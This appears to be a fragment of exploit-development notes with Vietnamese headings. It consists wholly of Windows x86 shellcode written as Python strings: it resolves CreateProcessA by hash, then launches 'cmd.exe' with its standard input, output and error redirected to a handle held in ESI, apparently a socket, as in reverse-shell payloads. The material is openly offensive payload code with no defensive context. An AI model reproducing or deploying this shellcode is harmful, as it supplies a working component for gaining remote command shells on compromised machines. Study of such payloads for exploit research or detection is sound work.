## Assembly:
### Tìm hàm
```
code += "push 0x16b3fe72;" # CreateProcessA
code += "call dword ptr [ebp + 0x4];" # call find_function
code += "mov [ebp + 0x10], eax;" # save CreateProcessA
```
### Gọi hàm
```
code += "   push  esi   ;"  #   Push hStdError
code += "   push  esi   ;"  #   Push hStdOutput
code += "   push  esi   ;"  #   Push hStdInput
code += "   xor   eax, eax  ;"  #   Null EAX   
code += "   push  eax   ;"  #   Push lpReserved2
code += "   push  eax   ;"  #   Push cbReserved2 & wShowWindow
code += "   mov   ax, 0x101  ;"  #   Move 0x80 to AL
code += "   dec eax;    "
code += "   push  eax   ;"  #   Push dwFlags
code += "   xor   eax, eax  ;"  #   Null EAX   
code += "   push  eax   ;"  #   Push dwFillAttribute
code += "   push  eax   ;"  #   Push dwYCountChars
code += "   push  eax   ;"  #   Push dwXCountChars
code += "   push  eax   ;"  #   Push dwYSize
code += "   push  eax   ;"  #   Push dwXSize
code += "   push  eax   ;"  #   Push dwY
code += "   push  eax   ;"  #   Push dwX
code += "   push  eax   ;"  #   Push lpTitle
code += "   push  eax   ;"  #   Push lpDesktop
code += "   push  eax   ;"  #   Push lpReserved
code += "   mov   al, 0x44  ;"  #   Move 0x44 to AL
code += "   push  eax   ;"  #   Push cb
code += "   push  esp   ;"  #   Push pointer to the STARTUPINFOA structure
code += "   pop   edi   ;"  #   Store pointer to STARTUPINFOA in EDI
code += " create_cmd_string: "  #
code += "   mov   eax, 0xff9a879b   ;"  #   Move 0xff9a879b into EAX
code += "   neg   eax   ;"  #   Negate EAX, EAX = 00657865
code += "   push  eax   ;"  #   Push part of the "cmd.exe" string
code += "   push  0x2e646d63;"  #   Push the remainder of the "cmd.exe" string
code += "   push  esp   ;"  #   Push pointer to the "cmd.exe" string
code += "   pop   ebx   ;"  #   Store pointer to the "cmd.exe" string in EBX
code += " call_createprocessa:   "  #
code += "   mov   edx, esp  ;"  
code += " mov eax, edx;"        #   Move ESP to EAX
code += "   xor   ecx, ecx  ;"  #   Null ECX
code += "   mov   cx, 0x390 ;"  #   Move 0x390 to CX
code += "   sub   eax, ecx  ;"  #   Subtract CX from EAX to avoid overwriting the structure later
code += "   push  eax   ;"  #   Push lpProcessInformation
code += "   push  edi   ;"  #   Push lpStartupInfo
code += "   xor   eax, eax  ;"  #   Null EAX   
code += "   push  eax   ;"  #   Push lpCurrentDirectory
code += "   push  eax   ;"  #   Push lpEnvironment
code += "   push  eax   ;"  #   Push dwCreationFlags
code += "   inc   eax   ;"  #   Increase EAX, EAX = 0x01 (TRUE)
code += "   push  eax   ;"  #   Push bInheritHandles
code += "   dec   eax   ;"  #   Null EAX
code += "   push  eax   ;"  #   Push lpThreadAttributes
code += "   push  eax   ;"  #   Push lpProcessAttributes
code += "   push  ebx   ;"  #   Push lpCommandLine
code += "   push  eax   ;"  #   Push lpApplicationName
code += "   call dword ptr [ebp+0x10]   ;"  #   Call CreateProcessA
```
